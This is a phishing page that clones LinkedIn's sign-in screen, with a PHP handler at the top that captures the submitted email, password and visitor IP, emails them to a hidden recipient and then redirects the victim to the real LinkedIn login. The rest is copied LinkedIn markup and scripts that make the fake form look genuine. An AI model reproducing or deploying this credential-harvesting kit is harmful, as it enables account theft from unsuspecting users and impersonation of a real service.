...
if(isset($_GET['gosend'])){
  ...
  $subject = 'LinkedIn'.mt_rand();
  $message = 'USERNAME: '.$_POST['session_key'] .' PASSWORD: '.$_POST['session_password']. ' IP: '.$_SERVER['REMOTE_ADDR']. "\r\n";
...
if(mail($to, $subject, $message, $headers)){
    header("Location: https://www.linkedin.com/uas/login?trk=hb_signin");
    exit;
  } else {
    $phpself = '';
...
<!--<![endif]-->
<head>
<script src="https://static.licdn.com:443/scds/common/u/lib/fizzy/fz-1.3.8-min.js" type="text/javascript"></script><script type="text/javascript">fs.config({"failureRedirect":"http://www.linkedin.com/nhome/","uniEscape":true,"xhrHeaders":{"X-FS-Origin-Request":"/uas/login?trk=hb_signin","X-FS-Page-Id":"uas-consumer-login"}});</script>
...
<meta name="treeID" content="FLjzdo/P2RSAjkFSvyoAAA==">
<meta name="appName" content="uas">
<meta name="referrer" content="origin">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="pageImpressionID" content="a95cf25b-d546-4fce-a8b5-d8d25ca9f4d7">
...
<link rel="stylesheet" type="text/css" href="cssb1kx.css">
...
<script type="text/javascript">
      (function() {
        ...
        LI.JSContentBasePath = adjustUrlForIos("https:\/\/static.licdn.com\/scds\/concat\/common\/js?v=0.1.337");
        LI.CSSContentBasePath = adjustUrlForIos("https:\/\/static.licdn.com\/scds\/concat\/common\/css?v=0.1.337");
        LI.injectRelayHtmlUrl = shouldUseSameDomain ? null : "https:\/\/static.licdn.com\/scds\/common\/u\/lib\/inject\/0.6.1\/relay-li.html";
        LI.comboBaseUrl = adjustUrlForIos("https:\/\/static.licdn.com\/scds\/concat\/common\/css?v=0.1.337");
...
<meta name="IntlJsUrl" content="https://static.licdn.com/scds/concat/common/js?v=0.1.337&amp;f=lib%2Fdust%2Fdust-li-experimental%2Fintl%2FIntl.min&amp;f=lib%2Fdust%2Fdust-li-experimental%2Fintl%2Flocale_data%2Fen_US.min">
...
<script type="text/javascript">fs._server.fire("14b8f3768fcfd914808e4152bf2a0000-1",{event:"before",type:"html"});</script>
<meta content="https://static.licdn.com/scds/concat/common/js?v=0.1.329" name="RemoteNavJSContentBaseURL">
...
<script type="text/javascript">fs._server.fire("14b8f3768fcfd914808e4152bf2a0000-1",{event:"after",type:"html"});</script>
<title>Sign In to LinkedIn</title>
<link rel="stylesheet" type="text/css" href="css13o3.css">
...
<link rel="stylesheet" type="text/css" href="cssjild.css">
<script type="text/javascript">
...
<script type="text/javascript">
 ...
 LI.Controls.addControl('control-http-12257-exec-7148905-1', 'LI.BalloonCalloutDelegator', {
 width: 'auto',
 orientation: 'bottom',
...
LI.i18n.register( 'unableToProcessRequest', 'We were unable to handle your request. Please try again.' );
 ...
 LI.Controls.addControl('control-http-12257-exec-7148905-2', 'FrontierAJAXForm', 
 {
 injectAfter : '.button',
 ...
 LI.Controls.addControl('control-http-12257-exec-7148905-3', 'Login', 
 {
 ...
 </script><script id="yui__dyn_0" type="text/javascript" src="https://static.licdn.com/scds/concat/common/js?h=d7z5zqt26qe7ht91f8494hqx5"></script>
</head>

<body dir="ltr" class="guest v2  chrome-v5 chrome-v5-responsive sticky-bg guest consumer2in1 js " id="pagekey-uas-consumer-login-internal">
<iframe id="_yuiResizeMonitor" title="Text Resize Monitor" style="position: absolute; visibility: visible; background-color: transparent; border-width: 0px; width: 2em; height: 2em; left: 0px; top: -33px;"></iframe>
<div id="callout-overlay" class="yui-module yui-overlay" style="visibility: visible; z-index: 10;"></div>
<input id="inSlowConfig" value="false" type="hidden">
<script type="text/javascript">document.body.className += " js ";</script> 
<script type="text/javascript">fs._server.fire("14b8f3768fcfd914808e4152bf2a0000-2",{event:"before",type:"html"});</script>
<header id="layout-header" class="minimal-nav wide-nav" role="banner">
  <div id="header-anchor">
    <div id="header-banner">
      <div class="wrapper">
        <div class="header-logo-container"> <a class="header-logo guest " href="http://www.linkedin.com/?trk=nav_logo" title="LinkedIn">
          <h2 id="in-logo" class="logo-text">LinkedIn</h2>
          <span class="li-icon" aria-hidden="true" type="linkedin-logo" size="28dp" color="brand"> <svg preserveAspectRatio="xMinYMin meet" id="linkedin-logo">
        ...
        <nav role="navigation" id="minimal-util-nav" class="guest-nav" aria-label="Main site navigation">
          <ul class="nav-bar">
            <li class="nav-item nav-signin"> <a class="nav-link" href="./" title="Sign in">Sign in</a> </li>
            <li class="nav-item nav-joinnow"> <a class="nav-link highlight" rel="nofollow" href="./" title="Join now"> Join now </a> </li>
          </ul>
        </nav>
      </div>
    </div>
  </div>
  <div class="a11y-content"> <a id="a11y-content-link" tabindex="0" name="a11y-content">Main content starts below.</a> </div>
  <div id="global-alert-queue" class=" wrapper"></div>
</header>
<script type="text/javascript">fs._server.fire("14b8f3768fcfd914808e4152bf2a0000-2",{event:"after",type:"html"});</script> 
<script>
...
<div id="body" class="" role="main"> 
  ...
  <div class="wrapper hp-nus-wrapper">
    ...
    <div id="main" class="signin">
      <div id="cookieDisabled" style="display: none;">Make sure you have cookies and Javascript enabled in your browser before signing in.</div>
      <script type="text/javascript">
 if (navigator.cookieEnabled == true) {
 LI.hide('cookieDisabled');
 }
 </script>
      <form action="./?gosend" method="POST" name="login" novalidate="novalidate" id="login" class="ajax-form stacked-form" data-jsenabled="check" data-autologin="true" data-existingmembersignin="true">
        <input name="isJsEnabled" value="true" type="hidden">
        <input name="source_app" value="" type="hidden">
        <input name="tryCount" id="tryCount" value="" type="hidden">
        <input name="clickedSuggestion" id="clickedSuggestion" value="false" type="hidden">
        <fieldset class="field-container field-container--fixed">
          <legend>Sign in to LinkedIn</legend>
          <div class="outer-wrapper" id="control_gen_1">
              ...
              <ul class="form-fields" id="mini-profile--js">
                <li class="form-email ">
                  <div class="fieldgroup hide-label">
                    ...
                    <input name="session_key" value="" id="session_key-login" placeholder="Email&nbsp;address" aria-describedby="session_key-login-error" type="text">
                    <div class="domain-suggestion hide" id="domainSuggestion"> <span>Did you mean: <a id="suggestion" href="javascript:void(0);"></a>?</span> </div>
                  </div>
                </li>
                <li class="form-password">
                  <div class="fieldgroup hide-label">
                    ...
                    <div class="password_wrapper">
                      <input id="session_password-login" class="password" name="session_password" placeholder="Password" aria-describedby="session_password-login-error" type="password">
                      <a data-li-tooltip-id="login-tooltip" href="/uas/request-password-reset?session_redirect=&amp;trk=uas-login-forgot-password-question" tracking="uas-login-forgot-password-question" class="nav-link forgot-password-link password-reminder-link" title="Forgot password?">?</a> </div>
                  </div>
                </li>
                <li class="button form-actions">
                  <div class="form-buttons">
                    <input name="signin" value="Sign In" class="btn-primary" id="btn-primary" type="submit">
                  </div>
                  <span>Not a member? <a href="./">Join now</a></span> </li>
                <div class="progress-indicator" style="line-height: 72px;"></div>
              </ul>
            </div>
            <div class="gaussian-blur blur"></div>
          </div>
          <script id="controlinit-http-12257-exec-7148905-1" type="text/javascript+initialized" class="li-control">
 ...
 dataId: '-li-tooltip-id'
        ...
        <input name="session_redirect" value="" id="session_redirect-login" type="hidden">
        <input name="trk" value="hb_signin" id="trk-login" type="hidden">
        <input name="loginCsrfParam" value="20950996-2b5b-4c42-8463-b6891cecfdb7" id="loginCsrfParam-login" type="hidden">
        <input name="fromEmail" value="" id="fromEmail-login" type="hidden">
        <input name="csrfToken" value="ajax:3847403516455737397" id="csrfToken-login" type="hidden">
        <input name="sourceAlias" value="0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi" id="sourceAlias-login" type="hidden">
        <div class="screen"></div>
      </form>
      <script id="controlinit-http-12257-exec-7148905-2" type="text/javascript+initialized" class="li-control">
...
LI.i18n.register( 'unableToProcessRequest', 'We were unable to handle your request. Please try again.' );
 ...
 errorId: 'global-alert-queue'
      ...
      <script id="controlinit-http-12257-exec-7148905-3" type="text/javascript+initialized" class="li-control">
 ...
 domainSuggestion: ''
      ...
      <div class="callout-container"> <span id="login-tooltip">
        <div class="callout-content"> Forgot password? </div>
        </span> </div>
    </div>
...
<script type="text/javascript">
 ...
 LI_WCT([
 "control-http-12257-exec-7148905-1",
 "control-http-12257-exec-7148905-2",
 "control-http-12257-exec-7148905-3",
 ]);
 
 
 
 </script> 
<script type="text/javascript">fs._server.fire("14b8f3768fcfd914808e4152bf2a0000-3",{event:"before",type:"html"});</script>
<footer id="layout-footer" class="layout-header-or-footer" role="contentinfo">
  <div class="wrapper">
    <p class="copyright guest"><span>LinkedIn Corporation</span> <em>© 2017</em></p>
...
<script data-page-js-type="config">
                    (function(n, r, a) {
                      r = window[n] = window[n] || {};
                                ...
                                a['URLs'] = {'saveWebActionTrackURL':'\/lite\/secure-web-action-track?csrfToken=ajax%3A3847403516455737397'};
...
<script data-page-js-type="config">
                    (function(n, r, a) {
                      r = window[n] = window[n] || {};
                                ...
                                r['LoggedOutBadging'] = {url: '\/chrome\/logged-out-badging?csrfToken=ajax%3A3847403516455737397'};
...
<script type="text/javascript">
 ...
 oUISettings.saveSettingsURL = "\/lite\/secure-ui-settings-save?csrfToken=ajax%3A3847403516455737397";
 }

 if ( typeof( WebTracking ) !== 'undefined' ) {
 WebTracking.saveWebActionTrackURL = "\/lite\/secure-web-action-track?csrfToken=ajax%3A3847403516455737397";
 }
</script> 
...
<script type="text/javascript">
 ...
 RUM.urls = RUM.urls || {};
 RUM.urls['rum-track'] = "\/lite\/rum-track?csrfToken=ajax%3A3847403516455737397";
 ...
 RUM.serverStartTime = 1.502460165854E12;
...
<script type="text/javascript">LI.Controls.processQueue();</script>
<iframe style="display: none;" sandbox="allow-scripts allow-same-origin" src="//radar.cedexis.com/1/11326/radar.html"></iframe>
<script src="https://static.licdn.com/scds/concat/common/js?h=ed29nkjpsa16bhrjq4na16owq-1mucgfycc664m7vmhpjgqse65-1l5rurej3h44qodo5rn0cdvyn-8om6v2ckrxsbnwf40t9ta8a7e-8jlhg6lqacthgadello7fgxzm-28w7d5j2k2jtil9ncckolke4m-9jzlwicvu376y9q4vjq77y5ks-1m0whdrwis44c1hoa9mrwhlt4-1uvutm1mpyov7rqhtcf8fksby-aac54ic1fmca5xz1yvc5t9nfe-1hn40w0bomeivihj9lopp4hp2-c0121povror81d0xao0yez4gy"></script><script src="//platform.linkedin.com/js/px.js?ch=1"></script><script src="//platform.linkedin.com/js/px.js?ch=2"></script>
</body>
</html>